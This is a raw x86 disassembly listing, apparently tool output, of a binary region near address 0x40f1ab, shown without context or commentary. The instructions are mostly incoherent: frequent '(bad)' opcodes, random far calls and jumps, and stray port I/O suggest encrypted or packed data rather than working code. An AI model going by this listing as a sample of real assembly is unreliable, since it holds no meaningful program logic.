  40f1ab:	into   
  40f1ac:	mov    WORD PTR fs:[eax],?
  40f1af:	jb     0x40f148
  40f1b1:	repz inc esp
  40f1b3:	aad    0x33
  40f1b5:	aaa    
  40f1b6:	jle    0x40f1ae
  40f1b8:	sbb    ah,BYTE PTR [ebp-0x66]
  40f1bb:	xor    cl,BYTE PTR [edx]
  40f1bd:	add    eax,0x301726ca
  40f1c2:	mov    ch,0x53
  40f1c4:	lds    esi,FWORD PTR [eax+0x794a0702]
  40f1ca:	sub    eax,0x37ef6c4f
  40f1cf:	sbb    al,0x7
  40f1d1:	into   
  40f1d2:	mov    dh,0xd9
  40f1d4:	xor    eax,0xf4c0e358
  40f1d9:	mov    bh,0xe5
  40f1db:	retf   
  40f1dc:	push   es
  40f1dd:	ins    BYTE PTR es:[edi],dx
  40f1de:	mov    eax,0xb842ad04
  40f1e3:	push   ds
  40f1e4:	les    ebx,FWORD PTR [edi+0x3f]
  40f1e7:	popf   
  40f1e8:	mov    DWORD PTR [eax+0xed89d01],ebx
  40f1ee:	xor    DWORD PTR [esi+ecx*1-0x10fa9c3e],edx
  40f1f5:	dec    eax
  40f1f6:	shl    DWORD PTR [esi+0x23db6225],cl
  40f1fc:	cmp    bl,dl
  40f1fe:	push   ss
  40f1ff:	ret    0xd8c9
  40f202:	mov    ebp,0xfc51c10b
  40f207:	or     BYTE PTR [eax-0x7124d7a6],0x67
  40f20e:	inc    ecx
  40f20f:	mov    ds:0x14882e27,al
  40f214:	call   0x81f5:0x9012664f
  40f21b:	xchg   edx,eax
  40f21c:	mov    al,ds:0xce035d60
  40f221:	ja     0x40f1ae
  40f223:	cmc    
  40f224:	in     al,0x78
  40f226:	jle    0x40f283
  40f228:	add    al,0x25
  40f22a:	and    dl,BYTE PTR [esi+esi*4+0x63]
  40f22e:	dec    eax
  40f22f:	push   0xa750c704
  40f234:	xor    dl,BYTE PTR cs:[edx-0xe32f633]
  40f23b:	cdq    
  40f23c:	loop   0x40f278
  40f23e:	push   ecx
  40f23f:	out    0xbe,eax
  40f241:	inc    eax
  40f242:	call   0x7845247c
  40f247:	adc    DWORD PTR [ebp+0x10],ecx
  40f24a:	pop    ecx
  40f24b:	mov    bh,0xf1
  40f24d:	xchg   DWORD PTR [eax+0xca84b92],ebp
  40f253:	outs   dx,BYTE PTR ds:[esi]
  40f254:	aam    0x0
  40f256:	jmp    0xb295:0x7061252c
  40f25d:	ja     0x40f236
  40f25f:	or     DWORD PTR [esi-0x68444304],esp
  40f265:	stos   DWORD PTR es:[edi],eax
  40f266:	sbb    BYTE PTR [esi+0x1f],dh
  40f269:	xchg   ecx,eax
  40f26a:	mov    dh,0xfe
  40f26c:	sub    ebp,DWORD PTR [esi-0x5c0d1ee8]
  40f272:	(bad)  
  40f273:	iret   
  40f274:	dec    esi
  40f275:	jmp    edi
  40f277:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f278:	push   edx
  40f279:	sub    al,0xd6
  40f27b:	inc    esp
  40f27c:	std    
  40f27d:	fwait
  40f27e:	cmp    BYTE PTR [ebp-0x317e8314],dl
  40f284:	addr16 mov eax,ds:0x2c96
  40f288:	ds inc edx
  40f28a:	(bad)  [ebx-0x1e]
  40f28d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f28e:	dec    ebp
  40f28f:	pop    eax
  40f290:	mov    bl,0x54
  40f292:	sub    dh,BYTE PTR [ebp+0xbf20d73]
  40f298:	ja     0x40f2e5
  40f29a:	sbb    BYTE PTR [ebx-0x2abf993],ah
  40f2a0:	pop    edi
  40f2a1:	add    al,0x7d
  40f2a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f2a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f2a5:	mov    bh,0xfc
  40f2a7:	push   cs
  40f2a8:	add    DWORD PTR [edx+0x28ade079],esp
  40f2ae:	shr    DWORD PTR [edi+0x71],0xde
  40f2b2:	shl    BYTE PTR [esi],cl
  40f2b4:	cmp    al,0x4b
  40f2b6:	cwde   
  40f2b7:	adc    al,0x36
  40f2b9:	dec    edi
  40f2ba:	shr    BYTE PTR [ebx],1
  40f2bc:	adc    BYTE PTR [esi+0x2911c12a],dh
  40f2c2:	push   0xfe65eb52
  40f2c7:	xchg   edx,eax
  40f2c8:	pop    es
  40f2c9:	int3   
  40f2ca:	jo     0x40f272
  40f2cc:	cli    
  40f2cd:	push   ebx
  40f2ce:	imul   edx,DWORD PTR [edx-0x79],0xffffff9b
  40f2d2:	lods   al,BYTE PTR ds:[esi]
  40f2d3:	div    DWORD PTR [edx-0x51]
  40f2d6:	xchg   esp,eax
  40f2d7:	xchg   BYTE PTR [esi+0x74ba7913],ah
  40f2dd:	shl    DWORD PTR [esi-0x33],cl
  40f2e0:	js     0x40f29b
  40f2e2:	cmp    BYTE PTR [esi],cl
  40f2e4:	mov    dh,0x99
  40f2e6:	mov    ecx,0x723c6868
  40f2eb:	mov    cl,0xf2
  40f2ed:	es xor eax,0xef68172
  40f2f3:	(bad)
  40f2f6:	xchg   BYTE PTR [ecx+ecx*2-0x4d],dl
  40f2fa:	(bad)  
  40f2fb:	imul   edi
  40f2fd:	test   DWORD PTR [edi+0x22bd9893],edx
  40f303:	cmp    eax,esp
  40f305:	repnz (bad) 
  40f307:	cmp    al,0x68
  40f309:	add    al,0x70
  40f30b:	sbb    al,0xe7
  40f30d:	xlat   BYTE PTR ds:[ebx]
  40f30e:	sbb    dh,BYTE PTR [edi-0x71]
  40f311:	adc    ebp,DWORD PTR [ecx-0x2f]
  40f314:	out    dx,eax
  40f315:	dec    ecx
  40f316:	xchg   DWORD PTR [esi],edi
  40f318:	je     0x40f2f1
  40f31a:	(bad)  
  40f31b:	in     eax,0x34
  40f31d:	pop    esp
  40f31e:	cwde   
  40f31f:	jmp    0xbee540e7
  40f324:	neg    BYTE PTR [ebx]
  40f326:	dec    ebp
  40f327:	push   esp
  40f328:	retf   0xe328
  40f32b:	jo     0x40f319
  40f32d:	in     eax,dx
  40f32e:	pop    edx
  40f32f:	xchg   edi,eax
  40f330:	xchg   edx,eax
  40f331:	xchg   ebx,eax
  40f332:	xchg   ebx,eax
  40f333:	call   0xebaa:0x4aa1ba38
  40f33a:	and    DWORD PTR [esi],esi
  40f33c:	fisub  WORD PTR [ebx]
  40f33e:	cmp    BYTE PTR [edi+ebp*1+0x6b],ch
  40f342:	dec    edi
  40f343:	mov    ds:0x7d00e543,al
  40f348:	xchg   ecx,edi
  40f34a:	clc    
  40f34b:	xchg   ecx,eax
  40f34c:	xchg   esi,eax
  40f34d:	fimul  WORD PTR [esi+0x8fbccca]
  40f353:	xor    bl,BYTE PTR ds:0x8cf8bd9f
  40f359:	mov    ah,0x84
  40f35b:	out    0xf,al
  40f35d:	mov    dl,BYTE PTR [edi-0x33]
  40f360:	dec    ebx
  40f361:	mov    bl,0x29
  40f363:	cld    
  40f364:	sub    BYTE PTR [eax+0x1249b898],bh
  40f36a:	mov    bh,BYTE PTR [ebx]
  40f36c:	add    BYTE PTR [ecx+eiz*1],ah
  40f36f:	ja     0x40f31d
  40f371:	dec    ebx
  40f372:	stc    
  40f373:	jnp    0x40f333
  40f375:	xchg   ebp,eax
  40f376:	or     eax,DWORD PTR [edx-0x20]
  40f379:	mov    cl,0x28
  40f37b:	add    bh,al
  40f37d:	scas   al,BYTE PTR es:[edi]
  40f37e:	fld    QWORD PTR [ecx]
  40f380:	add    DWORD PTR [ecx+0x26],ebx
  40f383:	pop    ebx
  40f384:	call   0x5eca:0xc6ca9f91
  40f38b:	cwde   
  40f38c:	imul   eax,DWORD PTR [ebx+0x712e3cee],0xf0e2ee19
  40f396:	push   ss
  40f397:	inc    esp
  40f398:	mov    eax,ds:0xd19e4da4
  40f39d:	sub    ecx,DWORD PTR ds:0xf5fb1023
  40f3a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f3a4:	call   0x2051:0x967721d8
  40f3ab:	dec    DWORD PTR [edi+0x724c097e]
  40f3b1:	in     al,0x21
  40f3b3:	pop    ecx
  40f3b4:	fwait
  40f3b5:	and    BYTE PTR [esi-0x2a8a3638],bl
  40f3bb:	pop    ebp
  40f3bc:	pop    edi
  40f3bd:	mov    cl,0xa4
  40f3bf:	cld    
  40f3c0:	cli    
  40f3c1:	xor    esi,eax
  40f3c3:	ss retf 0xca0b
  40f3c7:	dec    ecx
  40f3c8:	pop    ecx
  40f3c9:	cmp    DWORD PTR [ecx+0x49],ebx
  40f3cc:	sahf   
  40f3cd:	dec    ecx
  40f3ce:	jnp    0x40f382
  40f3d0:	pop    esi
  40f3d1:	push   cs
  40f3d2:	mov    ebp,0xa1a68b19
  40f3d7:	test   al,0x4e
  40f3d9:	imul   ebp,DWORD PTR [edx+0x1],0xb7a5bec4
  40f3e0:	mov    ds:0x1545aadf,eax
  40f3e5:	shl    ebp,cl
  40f3e7:	jmp    0x40f37a
  40f3e9:	dec    ebx
  40f3ea:	push   es
  40f3eb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f3ec:	(bad)  
  40f3ed:	pop    ss
  40f3ee:	xor    BYTE PTR [ebx-0x76662900],dh
  40f3f4:	add    DWORD PTR [ecx],0x2
  40f3f7:	stc    
  40f3f8:	out    dx,eax
  40f3f9:	outs   dx,DWORD PTR ds:[esi]
  40f3fa:	retf   0x9c30
  40f3fd:	jmp    0xe702b032
  40f402:	add    ebp,DWORD PTR ds:0x6197c743
  40f408:	jge    0x40f470
  40f40a:	jp     0x40f3c6
  40f40c:	dec    ecx
  40f40d:	fwait
  40f40e:	ins    BYTE PTR es:[edi],dx
  40f40f:	jle    0x40f47b
  40f411:	jmp    0xb2c0:0x4a008523
  40f418:	retf   
  40f419:	jae    0x40f3cb
  40f41b:	test   DWORD PTR [ebp+edx*2-0x5d],edi
  40f41f:	aam    0xd9
  40f421:	clc    
  40f422:	imul   ebx,DWORD PTR [edi+0x26ecc],0x5d21dc57
  40f42c:	pop    es
  40f42d:	jp     0x40f474
  40f42f:	iret   
  40f430:	je     0x40f436
  40f432:	aam    0x3
  40f434:	dec    esi
  40f435:	sub    BYTE PTR ds:0x606d13c,bh
  40f43b:	mov    edi,0x21dcad6e
  40f440:	push   ebx
  40f441:	test   BYTE PTR [edx+0x66],cl
  40f444:	xor    eax,0xad80e6e
  40f449:	jne    0x40f4a9
  40f44b:	dec    esi
  40f44c:	add    al,0xeb
  40f44e:	mov    esi,0xf4205478
  40f453:	(bad)  
  40f454:	or     bl,BYTE PTR [eax-0x5486652e]
  40f45a:	ret    
  40f45b:	pop    eax
  40f45c:	push   es
  40f45d:	out    0xbc,eax
  40f45f:	pop    edx
  40f460:	lods   eax,DWORD PTR ds:[esi]
  40f461:	call   0x26972227
  40f466:	push   es
  40f467:	cs scas eax,DWORD PTR es:[edi]
  40f469:	xchg   edx,eax
  40f46a:	test   DWORD PTR [edx],edx
  40f46c:	int3   
  40f46d:	mov    eax,0xd4cd5a6b
  40f472:	(bad)  
  40f473:	push   esp
  40f474:	adc    al,0x2f
  40f476:	jge    0x40f44a
  40f478:	or     BYTE PTR [esi+0x44],0x2f
  40f47c:	jns    0x40f450
  40f47e:	push   ecx
  40f47f:	add    BYTE PTR [edi-0xcb8e30e],al
  40f485:	out    dx,eax
  40f486:	in     al,dx
  40f487:	jns    0x40f4fc
  40f489:	mov    al,ds:0xdefb9c91
  40f48e:	ins    DWORD PTR es:[edi],dx
  40f48f:	pop    edi
  40f490:	inc    DWORD PTR [ebx]
  40f492:	xchg   ecx,eax
  40f493:	pop    ds
  40f494:	int3   
  40f495:	adc    eax,eax
  40f497:	sub    BYTE PTR [edx],bl
  40f499:	lock (bad) 
  40f49b:	data16 (bad) 
  40f49d:	(bad)  
  40f49e:	fstp   TBYTE PTR [edi-0x21]
  40f4a1:	dec    ebp
  40f4a2:	call   0xb1f8:0x61cb1584
  40f4a9:	scas   al,BYTE PTR es:[edi]
  40f4aa:	jne    0x40f4e0
  40f4ac:	mov    bh,0x26
  40f4ae:	add    ax,0x1068
  40f4b2:	in     al,dx
  40f4b3:	jne    0x40f468
  40f4b5:	fldcw  WORD PTR [edi-0x12]
  40f4b8:	mov    al,ds:0x810a6226
  40f4bd:	xchg   ebp,eax
  40f4be:	outs   dx,DWORD PTR ds:[esi]
  40f4bf:	inc    edx
  40f4c0:	or     al,0xd1
  40f4c2:	pushf  
  40f4c3:	int3   
  40f4c4:	jl     0x40f50b
  40f4c6:	mov    BYTE PTR [eax],al
  40f4c8:	sbb    ebx,DWORD PTR [ecx]
  40f4ca:	mov    al,0xd4
  40f4cc:	sahf   
  40f4cd:	loopne 0x40f482
  40f4cf:	inc    ebp
  40f4d0:	in     eax,dx
  40f4d1:	pop    eax
  40f4d2:	pop    es
  40f4d3:	loope  0x40f49b
  40f4d5:	add    eax,0xa730804e
  40f4da:	or     ah,BYTE PTR [edi+edi*2+0x7aba3573]
  40f4e1:	xchg   ecx,eax
  40f4e2:	xor    DWORD PTR [eax],0x3c
  40f4e5:	lods   eax,DWORD PTR ds:[esi]
  40f4e6:	pop    esp
  40f4e7:	sbb    eax,0x1f7e0cdf
  40f4ec:	out    0x8d,al
  40f4ee:	xor    bh,ah
  40f4f0:	pop    ecx
  40f4f1:	jg     0x40f4d3
  40f4f3:	cs cdq 
  40f4f5:	mov    ch,BYTE PTR [ebx-0x739a3f7]
  40f4fb:	jno    0x40f4d5
  40f4fd:	and    esi,esp
  40f4ff:	(bad)  
  40f500:	fwait
  40f501:	mov    bh,0x4
  40f503:	adc    BYTE PTR ss:[ebx-0x28ec3e2d],0xfa
  40f50b:	clc    
  40f50c:	scas   eax,DWORD PTR es:[edi]
  40f50d:	mov    al,0x0
  40f50f:	test   al,0x98
  40f511:	cmp    edx,DWORD PTR [esi]
  40f513:	mov    ebp,0xba4cf0a4
  40f518:	hlt    
  40f519:	add    DWORD PTR [eax-0x35],ebp
  40f51c:	imul   esp,ebp,0xffffffe9
  40f51f:	lea    eax,[ebp+0x64]
  40f522:	shl    BYTE PTR [eax],1
  40f524:	xchg   ecx,eax
  40f525:	fs hlt 
  40f527:	(bad)  
  40f528:	pop    edi
  40f529:	adc    ebx,ecx
  40f52b:	sub    BYTE PTR [edx+edx*2+0x7df1fcb6],bh
  40f532:	mov    al,ds:0xf1fe58ea
  40f537:	stos   DWORD PTR es:[edi],eax
  40f538:	and    DWORD PTR [ecx-0x566d4a97],esp
  40f53e:	pop    esi
  40f53f:	lods   eax,DWORD PTR ds:[esi]
  40f540:	mov    al,0x7f
  40f542:	mov    cl,0xe9
  40f545:	jns    0x40f4db
  40f547:	jae    0x40f56d
  40f549:	pusha  
  40f54a:	jb     0x40f4f0
  40f54c:	out    dx,eax
  40f54d:	ss jno 0x40f5bb
  40f550:	add    al,BYTE PTR [edx-0x48]
  40f553:	pop    ss
  40f554:	cmp    BYTE PTR [eax+0x490fce78],ch
  40f55a:	push   es
  40f55b:	push   edx
  40f55c:	stos   DWORD PTR es:[edi],eax
  40f55d:	push   ds
  40f55e:	gs leave 
  40f560:	ror    DWORD PTR [esi+ebx*1],1
  40f563:	xchg   esp,eax
  40f564:	pop    edi
  40f565:	mov    esp,0x587bcdc9
  40f56a:	dec    esp
  40f56b:	scas   eax,DWORD PTR es:[edi]
  40f56c:	rcl    BYTE PTR ds:0xb4754dc4,0xbc
  40f573:	scas   al,BYTE PTR es:[edi]
  40f574:	mov    BYTE PTR [ebx-0x1],dl
  40f577:	inc    eax
  40f578:	sbb    BYTE PTR [ecx-0x32422db0],ah
  40f57e:	dec    ebp
  40f57f:	sahf   
  40f580:	sbb    eax,0xf271f298
  40f585:	fiadd  WORD PTR [ecx-0x25]
  40f588:	dec    eax
  40f589:	repnz out 0x22,eax
  40f58c:	lea    edi,[edx+0x71]
  40f58f:	pop    edi
  40f590:	pop    ss
  40f591:	inc    DWORD PTR [edx+0x35]
  40f594:	hlt    
  40f595:	or     dl,dl
  40f597:	dec    ebx
  40f598:	(bad)  
  40f599:	fucomi st,st(7)
  40f59b:	mov    bl,0x55
  40f59d:	call   0x9a98:0xa8e31bb4
  40f5a4:	sub    edi,DWORD PTR [ebx+0x45]
  40f5a7:	fdiv   st,st(2)
  40f5a9:	imul   esp,DWORD PTR [edi+0x3bac689e],0x4adbffb4
  40f5b3:	or     eax,0xb4115b74
  40f5b8:	dec    cx
  40f5ba:	or     dh,bl
  40f5bc:	dec    eax
  40f5bd:	pop    ss
  40f5be:	sar    ah,cl
  40f5c0:	jo     0x40f5c9
  40f5c2:	pop    ecx
  40f5c3:	les    edi,FWORD PTR [edi-0x4d]
  40f5c6:	xor    ebp,DWORD PTR ds:0x74685fbf
  40f5cc:	inc    eax
  40f5cd:	add    BYTE PTR [eax],bh
  40f5cf:	pop    edi
  40f5d0:	mov    dl,0x56
  40f5d2:	cdq    
  40f5d3:	lods   eax,DWORD PTR ds:[esi]
  40f5d4:	call   0xd5c8:0xff54cb82
  40f5db:	gs ror esi,0x47
  40f5df:	jp     0x40f5db
  40f5e1:	out    dx,eax
  40f5e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f5e3:	inc    ecx
  40f5e4:	imul   ebx,edx,0xcc312b21
  40f5ea:	xor    ebx,0xbbe1aef0
  40f5f0:	(bad)  
  40f5f1:	cmp    eax,0xbee6b8c3
  40f5f6:	pushf  
  40f5f7:	adc    esi,DWORD PTR [edx-0x31]
  40f5fa:	les    esi,FWORD PTR [eax]
  40f5fc:	or     al,0xd7
  40f5fe:	mov    ecx,0x898e0190
  40f603:	sbb    esi,DWORD PTR ds:0x28d176a8
  40f609:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f60a:	adc    esp,DWORD PTR [ecx]
  40f60c:	cmp    DWORD PTR [edi-0x25],0x14
  40f610:	fmul   st(3),st
  40f612:	sahf   
  40f613:	and    BYTE PTR [eax],bh
  40f615:	adc    al,0xaf
  40f617:	nop
  40f618:	enter  0x2927,0x8
  40f61c:	sbb    DWORD PTR [edi-0x2b010ed5],edx
  40f622:	mov    ebx,0x65efb840
  40f627:	sar    BYTE PTR [ebp-0x67d8846a],cl
  40f62d:	js     0x40f6a0
  40f62f:	icebp  
  40f630:	push   ss
  40f631:	jecxz  0x40f61e
  40f633:	jns    0x40f62e
  40f635:	ds inc esi
  40f637:	out    0x70,eax
  40f639:	cmp    BYTE PTR [ebx-0x59],0xf0
  40f63d:	add    eax,0x22b16488
  40f642:	jl     0x40f641
  40f644:	jbe    0x40f674
  40f646:	mov    dl,0xb3
  40f648:	push   ebx
  40f649:	test   DWORD PTR [edx+0x30afaab7],ecx
  40f64f:	popa   
  40f650:	jns    0x40f617
  40f652:	jp     0x40f608
  40f654:	popf   
  40f655:	fisub  DWORD PTR [edi]
  40f657:	lock int3 
  40f659:	xchg   BYTE PTR [ebx],dh
  40f65b:	and    dl,cl
  40f65d:	test   al,0x63
  40f65f:	lods   al,BYTE PTR ds:[esi]
  40f660:	daa    
  40f661:	es push ss
  40f663:	jnp    0x40f6b7
  40f665:	pop    ss
  40f666:	data16 sar ch,1
  40f669:	mov    bh,al
  40f66b:	ficom  DWORD PTR [ebp-0x25fd3f10]
  40f671:	pop    ds
  40f672:	xor    al,0xc
  40f674:	std    
  40f675:	add    cl,ch
  40f677:	mov    eax,ds:0xfe2529cc
  40f67c:	fldcw  WORD PTR [esi]
  40f67e:	inc    ecx
  40f67f:	rol    eax,cl
  40f681:	icebp  
  40f682:	repz in eax,dx
  40f684:	adc    eax,0x68fae886
  40f689:	pop    edx
  40f68a:	cmp    BYTE PTR [esi-0x1fd49ce6],dl
  40f690:	aam    0x60
  40f692:	ret    
  40f693:	xor    DWORD PTR [ebp+0x1a],edi
  40f696:	cld    
  40f697:	lods   al,BYTE PTR ds:[esi]
  40f698:	push   ecx
  40f699:	mov    eax,ds:0x7a9885d1
  40f69e:	cmp    ch,BYTE PTR [eax-0x29]
  40f6a1:	fwait
  40f6a2:	push   0x6d138b4a
  40f6a7:	sar    dh,0x38
  40f6aa:	out    dx,al
  40f6ab:	cmp    esp,DWORD PTR [ebx+0x486af7dc]
  40f6b1:	outs   dx,DWORD PTR ds:[esi]
  40f6b2:	mov    edi,0x249b9f46
  40f6b7:	add    al,0x3c
  40f6b9:	jl     0x40f66e
  40f6bb:	mov    ecx,0x78ffa5a9
  40f6c0:	loopne 0x40f6a7
  40f6c2:	xchg   ebx,eax
  40f6c3:	jg     0x40f73a
  40f6c5:	loope  0x40f6b0
  40f6c7:	and    cl,BYTE PTR [ecx-0x39]
  40f6ca:	or     al,0xa8
  40f6cc:	xor    BYTE PTR [esi],0xa2
  40f6cf:	inc    eax
  40f6d0:	dec    ebx
  40f6d1:	pop    ss
  40f6d2:	sahf   
  40f6d3:	xchg   ebx,eax
  40f6d4:	ds adc ah,dl
  40f6d7:	mov    ah,0x7c
  40f6d9:	xor    DWORD PTR ds:0x4bb8de1f,ecx
  40f6df:	ins    DWORD PTR es:[edi],dx
  40f6e0:	jle    0x40f69e
  40f6e2:	mov    eax,ds:0xf3784681
  40f6e7:	leave  
  40f6e8:	bound  esi,QWORD PTR [ecx+0x25]
  40f6eb:	inc    ebx
  40f6ec:	retf   0x727c
  40f6ef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f6f0:	out    0x13,eax
  40f6f2:	or     esi,DWORD PTR [edi+eax*4+0x79]
  40f6f6:	sub    eax,0x20a0e57a
  40f6fb:	jle    0x40f6a9
  40f6fd:	jbe    0x40f6c6
  40f6ff:	ins    BYTE PTR es:[edi],dx
  40f700:	push   es
  40f701:	fimul  WORD PTR [ecx-0x33]
  40f704:	cmp    BYTE PTR [eax+0x7d],dl
  40f707:	leave  
  40f708:	retf   0xbf38
  40f70b:	ds push ecx
  40f70d:	mov    esi,0x72a99979
  40f712:	jb     0x40f6fb
  40f714:	loope  0x40f6b3
  40f716:	loop   0x40f733
  40f718:	pop    edx
  40f719:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f71a:	xchg   ebp,eax
  40f71b:	(bad)  
  40f71c:	pop    ebx
  40f71d:	sbb    edx,esp
  40f71f:	push   cs
  40f720:	out    dx,eax
  40f721:	pop    eax
  40f722:	not    DWORD PTR [esi]
  40f724:	xchg   esp,eax
  40f725:	pop    esp
  40f726:	jle    0x40f736
  40f728:	cli    
  40f729:	sti    
  40f72a:	aad    0x58
  40f72c:	sbb    esi,DWORD PTR [edi+eax*4-0x53662847]
  40f733:	and    ebx,DWORD PTR ss:[ebp+ecx*4+0x2ef97b10]
  40f73b:	cmp    BYTE PTR [eax],ch
  40f73d:	push   eax
  40f73e:	(bad)
  40f742:	xor    al,0xee
  40f744:	pop    es
  40f745:	sub    eax,0x2d2ddebc
  40f74a:	and    bl,dl
  40f74c:	xor    eax,0xb5869e19
  40f751:	imul   edx,eax,0xffffffb7
  40f754:	adc    al,BYTE PTR [esi+edi*2-0x54c5509a]
  40f75b:	arpl   sp,si
  40f75d:	out    dx,eax
  40f75e:	and    al,dl
  40f760:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f761:	in     eax,dx
  40f762:	xchg   BYTE PTR [edi-0x3f],al
  40f765:	or     eax,0x8bb8c385
  40f76a:	add    DWORD PTR [eax],ebp
  40f76c:	pop    es
  40f76d:	adc    DWORD PTR [edx-0x3cc6d1ce],ebp
  40f773:	cld    
  40f774:	loopne 0x40f7dd
  40f776:	push   0x8d49d98c
  40f77b:	ss in  eax,0xb3
  40f77e:	fs cmp al,0xb0
  40f781:	ja     0x40f77a
  40f783:	mov    esi,0xe8917c74
  40f788:	jp     0x40f739
  40f78a:	push   ds
  40f78b:	xchg   esi,ebx
  40f78d:	push   esi
  40f78e:	pop    ss
  40f78f:	dec    edx
  40f790:	in     eax,0xfb
  40f792:	xor    esp,eax
  40f794:	fbstp  TBYTE PTR [esi]
  40f796:	aam    0xda
  40f798:	cmp    DWORD PTR [ebp-0x53],esi
  40f79b:	(bad)  
  40f79c:	mov    ds:0x82a1fad8,eax
  40f7a2:	scas   al,BYTE PTR es:[edi]
  40f7a3:	shr    DWORD PTR [esi],1
  40f7a5:	adc    bl,bh
  40f7a7:	nop
  40f7a8:	fimul  WORD PTR [edi-0x5062b2a6]
  40f7ae:	jb     0x40f74e
  40f7b0:	mov    ebx,eax
  40f7b2:	xchg   ebx,eax
  40f7b3:	and    edi,ebx
  40f7b5:	clc    
  40f7b6:	pop    edx
  40f7b7:	mov    esp,0xf964ba10
  40f7bc:	add    DWORD PTR [edx-0x69ca9f9b],ebx
  40f7c2:	mov    dh,0x2
  40f7c4:	lock scas al,BYTE PTR es:[edi]
  40f7c6:	or     ah,dh
  40f7c8:	das    
  40f7c9:	jbe    0x40f79d
  40f7cb:	mov    bl,0xbd
  40f7cd:	ror    DWORD PTR [ebx],1
  40f7cf:	out    0x39,al
  40f7d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f7d2:	and    dl,ah
  40f7d4:	jl     0x40f7c7
  40f7d6:	sub    ebp,DWORD PTR [edx]
  40f7d8:	sub    ebx,DWORD PTR [ebx-0x24]
  40f7db:	sbb    DWORD PTR [edi],edx
  40f7dd:	es cmp ebx,edx
  40f7e0:	pop    ecx
  40f7e1:	repnz or al,0x77
  40f7e4:	aas    
  40f7e5:	push   ss
  40f7e6:	mov    esp,0x9dcf2a0b
  40f7eb:	dec    esi
  40f7ec:	push   esi
  40f7ed:	xor    bh,BYTE PTR [edi-0x723f9cc5]
  40f7f3:	outs   dx,BYTE PTR ds:[esi]
  40f7f4:	adc    eax,0x8546f310
  40f7f9:	sub    BYTE PTR [ebp-0x28],bh
  40f7fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f7fd:	cmp    BYTE PTR [ebx],al
  40f7ff:	push   edx
  40f800:	call   0xa3b4:0xa88ede5e
  40f807:	js     0x40f831
  40f809:	adc    BYTE PTR [esi+0x47],ch
  40f80c:	stos   BYTE PTR es:[edi],al
  40f80d:	enter  0x8c62,0x48
  40f811:	(bad)  
  40f812:	sbb    BYTE PTR [esi+0x1c],ch
  40f815:	inc    ebp
  40f816:	mov    dl,0x2b
  40f818:	in     eax,0x57
  40f81a:	jg     0x40f7f6
  40f81c:	int    0x32
  40f81e:	push   ebp
  40f81f:	data16 fcom QWORD PTR [edx-0x562da692]
  40f826:	aad    0xb
  40f828:	popf   
  40f829:	lock loop 0x40f883
  40f82c:	jmp    0x40f862
  40f82e:	inc    esi
  40f82f:	clc    
  40f830:	cmp    BYTE PTR [edi-0x2a],dh
  40f833:	cmc    
  40f834:	pop    esi
  40f835:	mov    edx,0xa0bc9b61
  40f83a:	pusha  
  40f83b:	mov    ds,eax
  40f83d:	and    BYTE PTR ds:0x682c6f3,dh
  40f843:	jns    0x40f890
  40f845:	inc    esp
  40f846:	frstor [edi]
  40f848:	dec    ebx
  40f849:	out    dx,al
  40f84a:	dec    BYTE PTR [ebx]
  40f84c:	test   al,0x1f
  40f84e:	push   0x405625aa
  40f853:	imul   DWORD PTR [ecx+0x723f7fea]
  40f859:	aad    0x9
  40f85b:	lds    ebx,FWORD PTR [ebx+0x31dd22b6]
  40f861:	inc    esi
  40f862:	add    eax,0x5e5b8337
  40f867:	fisub  DWORD PTR ds:0xb7bc7251
  40f86d:	lods   eax,DWORD PTR ds:[esi]
  40f86e:	sub    eax,0x3e3a22d2
  40f873:	push   ds
  40f874:	sbb    bl,BYTE PTR [edx+eax*4+0x7b]
  40f878:	jmp    0x321ee06d
  40f87d:	icebp  
  40f87e:	adc    al,0xda
  40f880:	fistp  DWORD PTR [edx-0xf]
  40f883:	scas   al,BYTE PTR es:[edi]
  40f884:	loop   0x40f81b
  40f886:	or     DWORD PTR [ebp+0x37],edi
  40f889:	dec    ebx
  40f88a:	loopne 0x40f87b
  40f88c:	bound  esi,QWORD PTR [ebx]
  40f88e:	(bad)  
  40f88f:	stc    
  40f890:	popa   
  40f891:	inc    esp
  40f892:	and    esp,DWORD PTR [ebx-0x7d23f4ab]
  40f898:	adc    ch,BYTE PTR [esi-0x60]
  40f89b:	push   0xd2883540
  40f8a0:	std    
  40f8a1:	shl    dl,1
  40f8a3:	xchg   edx,eax
  40f8a4:	sbb    ah,BYTE PTR [edx-0x50df7492]
  40f8aa:	lods   al,BYTE PTR ds:[esi]
  40f8ab:	xor    DWORD PTR [edi+0x45ae17f0],edi
  40f8b1:	mov    ss,edi
  40f8b3:	addr16 inc eax
  40f8b5:	add    esi,DWORD PTR [ebx+0x6]
  40f8b8:	das    
  40f8b9:	ss xor al,0xe2
  40f8bc:	cmp    BYTE PTR [edx+0x682c07bf],0x8f
  40f8c3:	rcl    BYTE PTR [ebp-0x3d63cfef],cl
  40f8c9:	ror    DWORD PTR [ebx+0x646e7859],1
  40f8cf:	ret    
  40f8d0:	rol    ecx,cl
  40f8d2:	sbb    eax,0x4afdd79d
  40f8d7:	pop    ds
  40f8d8:	ds fs enter 0x2af7,0xe5
  40f8de:	sbb    eax,0x4b3a95b6
  40f8e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f8e4:	mov    ?,WORD PTR [ecx]
  40f8e6:	jg     0x40f895
  40f8e8:	sbb    al,0xf5
  40f8ea:	aaa    
  40f8eb:	or     al,BYTE PTR [ecx-0xafc983]
  40f8f1:	dec    edx
  40f8f2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f8f3:	loopne 0x40f92a
  40f8f5:	adc    eax,0xe2491d7d
  40f8fa:	int3   
  40f8fb:	pop    eax
  40f8fc:	not    BYTE PTR [ecx]
  40f8fe:	aad    0xc7
  40f900:	or     edi,DWORD PTR [ebx+0x4c]
